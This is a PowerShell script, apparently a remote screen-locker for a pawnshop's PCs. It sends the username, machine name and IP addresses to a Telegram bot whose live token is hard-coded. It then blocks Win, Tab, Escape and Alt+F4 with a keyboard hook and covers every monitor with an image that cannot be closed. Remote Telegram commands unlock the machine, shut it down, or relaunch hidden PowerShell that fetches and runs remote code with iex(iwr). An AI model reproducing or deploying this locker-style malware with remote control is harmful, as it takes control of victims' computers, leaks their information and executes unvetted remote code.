# CONFIG
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$lockFilePath = "$env:LOCALAPPDATA\pawnshop_status.txt"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$user = $env:USERNAME
$machine = $env:COMPUTERNAME
$unlockCmd = "/unlock$user".ToLower()
$lockCmd   = "/lock$user".ToLower()
$shutdownCmd = "/shutdown$user".ToLower()

# Create lock file if missing
if (-not (Test-Path $lockFilePath)) {
    "locked" | Out-File $lockFilePath -Force
}

# Read current state
$locked = (Get-Content $lockFilePath -ErrorAction SilentlyContinue) -ne "unlocked"
if (-not $locked) { return }

# Send Telegram Notification
function Send-Telegram {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169\.254|255|^0' })[0].IPAddress
    } catch { $ip = "?" }
    try {
        $ipPublic = (Invoke-RestMethod "https://api.ipify.org") 
    } catch { $ipPublic = "?" }
    $msg = "🔒 PC-ul $user ($machine) a fost blocat.`nLocal IP: $ip`nPublic IP: $ipPublic`n`n/unlock$user`n/shutdown$user`n/lock$user"
    $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json"
}
Send-Telegram

# Download image
Invoke-WebRequest $imageURL -OutFile $tempImagePath -UseBasicParsing

# Import Windows.Forms for UI
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# KeyBlocker Class (Win, Alt, Alt+Tab, Win+Tab, Alt+F4)
Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private static IntPtr hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = HookCallback;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    private static bool alt = false;

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Block() {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public static void Unblock() {
        UnhookWindowsHookEx(hookID);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;

            if (key == Keys.LWin || key == Keys.RWin || key == Keys.Tab || key == Keys.Escape)
                return (IntPtr)1;
            if (key == Keys.F4 && (Control.ModifierKeys & Keys.Alt) == Keys.Alt)
                return (IntPtr)1;
        }
        return CallNextHookEx(hookID, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# Show full screen image on all monitors
$forms = @()
foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'
        WindowState = 'Maximized'
        StartPosition = 'Manual'
        TopMost = $true
        Location = $screen.Bounds.Location
        Size = $screen.Bounds.Size
        Cursor = [System.Windows.Forms.Cursors]::None
    }
    $img = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImagePath)
        Dock = 'Fill'
        SizeMode = 'StretchImage'
    }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $form.Add_Deactivate({ $_.Sender.Activate() })
    $form.Controls.Add($img)
    $form.Show()
    $forms += $form
}

# Telegram Polling
$script:AllowClose = $false
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($init.result.Count -gt 0) {
        $offset = ($init.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($update in $updates.result) {
            $offset = $update.update_id + 1
            $msg = $update.message.text.ToLower().Trim()
            if ($msg -eq $unlockCmd) {
                "unlocked" | Out-File $lockFilePath -Force
                $script:AllowClose = $true
                [Windows.Forms.Application]::Exit()
            }
            elseif ($msg -eq $shutdownCmd) {
                "unlocked" | Out-File $lockFilePath -Force
                Stop-Computer -Force
            }
            elseif ($msg -eq $lockCmd) {
                "locked" | Out-File $lockFilePath -Force
                Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (iwr 'https://raw.githubusercontent.com/diezul/x/main/k.ps1')`""
                [Windows.Forms.Application]::Exit()
            }
        }
    } catch {}
})
$timer.Start()

[Windows.Forms.Application]::Run()

# Cleanup
$timer.Stop()
[KeyBlocker]::Unblock()
